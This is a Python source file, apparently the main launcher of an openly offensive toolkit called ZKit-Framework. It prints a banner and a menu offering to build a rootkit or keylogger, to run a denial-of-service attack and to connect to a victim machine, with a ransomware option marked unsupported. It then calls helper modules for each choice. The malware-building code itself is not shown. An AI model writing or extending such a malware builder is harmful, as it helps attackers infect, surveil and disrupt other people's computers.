"ZKit-Framework Github : https://github.com/000Zer000/ZKit-Framework"
# Copyright (c) 2020, Zer0 . All rights reserved.
# This Work Is Licensed Under Apache Software License 2.0 More
# Can Be Found In The LICENSE File.
__author__ = "Zer0"
__version__ = "1.4.0"
__license__ = "Apache Software License 2.0"
__status__ = "Production"


def start():
    "Starts zkit with those beautiful menues"
    try:
        # Doing some imports
        from core.helper_core import notify, Color, generate, dos, \
            ctrler, helpbanner, init, print_banner
    except (ImportError, ModuleNotFoundError) as value:
        # Ops ! Sth is missing

        print(
            "One Or Some On Requirments Not Found . Please Install Them And Try Again ."
            + "Python Threw : "
            + str(value)
        )
        raise
    # Printing A Banner More Coming Soon
    _, red, green, yellow, blue, magenta, cyan, _, reset = Color().GetAllColors()
    init()
    print_banner()
    # Hard And Boring Code
    print(
        "\t " * 5 + "Hacking is" + red + " C " + green + "O " + blue + "L " +
        yellow + "O " + magenta + "R " + green +
        "F " + red + "U " + magenta + "L " + reset
    )
    print(
        "Available Options Are or Enter '?' To get a summery about notes of using this framework:\n"
        + "* = Not Supported right now\n"
        + red + "  {1} --> Create A RootKit\n"
        + green + "  {2} --> Create A Ransomware *\n"
        + blue + "  {3} --> Create A KeyLogger \n"
        + yellow + "  {4} --> Run A Dos Attack\n"
        + magenta + "  {5} --> Connect To A Victim\n"
        + cyan + "  {000}" + "--> Exit ZKit-Framework\n" + reset
    )
    while True:
        try:
            choice = str(input("..> "))

            if choice == "000":
                break
            if choice == "?":
                print(helpbanner)
            elif choice == "1":
                generate("rootkit")
            elif choice == "3":
                generate("keylogger")
            elif choice == "4":
                dos.Main()
            elif choice == "5":
                ctrler.main()
            elif choice is not None:
                notify(
                    "problem", "Invalid Input {" + "{}".format(choice) + "}")
        except (KeyboardInterrupt, EOFError):
            print("\nPlease Type '000' To Exit ZKit-Framework\n")
            choice = None


start()
